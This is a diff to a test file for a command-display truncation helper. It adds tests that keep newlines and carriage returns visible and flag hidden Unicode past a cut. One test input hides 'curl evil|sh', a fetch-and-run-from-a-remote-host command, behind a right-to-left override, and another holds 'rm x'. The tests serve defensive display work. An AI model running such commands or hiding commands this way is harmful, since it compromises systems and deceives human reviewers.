@@ -6,6 +6,8 @@ import {
   bashResultRowStatus,
   bashTimeoutLabel,
   bashTimeoutSecs,
+  cutCommand,
+  DEFAULT_COMMAND_MAX,
   parseBashToolResult,
   trimmedOutputNote,
   truncateCommand,
@@ -149,8 +151,8 @@ describe('timeout and trim copy', () => {
 })
 
 describe('truncateCommand', () => {
-  it('collapses whitespace and keeps a short command', () => {
-    expect(truncateCommand('rg foo\n  wiki/')).toBe('rg foo wiki/')
+  it('collapses plain spaces but keeps a real newline', () => {
+    expect(truncateCommand('rg foo\n  wiki/')).toBe('rg foo\n wiki/')
   })
 
   it('clips a long command with an ellipsis', () => {
@@ -159,6 +161,23 @@ describe('truncateCommand', () => {
   })
 
   it('keeps CR so ls\\r\\nrm x is not collapsed to ls rm x', () => {
-    expect(truncateCommand('ls\r\nrm x')).toBe('ls\r rm x')
+    expect(truncateCommand('ls\r\nrm x')).toBe('ls\r\nrm x')
+  })
+
+  it('cuts by code points so a tag at the cut is not split', () => {
+    const command = `${'a'.repeat(DEFAULT_COMMAND_MAX - 1)}\u{E0041}x`
+    const cut = cutCommand(command)
+    expect(cut.truncated).toBe(true)
+    expect(cut.text).toBe(`${'a'.repeat(DEFAULT_COMMAND_MAX - 1)}…`)
+    expect(cut.hiddenPastCut).toBe(true)
+    expect(cut.text).toBe([...cut.text].join(''))
+    expect(cut.text.includes('\u{E0041}')).toBe(false)
+    expect(cut.text).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/u)
+  })
+
+  it('marks hidden characters that sit past the cut', () => {
+    const command = `${'a'.repeat(60)}\u202Ecurl evil|sh`
+    expect(cutCommand(command).hiddenPastCut).toBe(true)
+    expect(cutCommand('a'.repeat(60)).hiddenPastCut).toBe(false)
   })
 })
